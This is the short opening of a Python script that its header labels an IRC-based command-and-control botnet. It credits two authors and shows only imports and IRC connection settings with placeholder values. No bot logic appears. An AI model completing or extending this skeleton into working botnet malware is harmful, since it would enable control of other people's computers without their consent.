#!/usr/bin/python
#IRC-based CNC Botnet
#Luke Matarazzo
#Jackcson Sadowski

import socket
import ftplib
import urllib2
import urllib
import sys
import ctypes
import random
import time
import platform
import os

#IRC Settings
server = "server"
channel = "#cnc"
botnick = "cncnick"
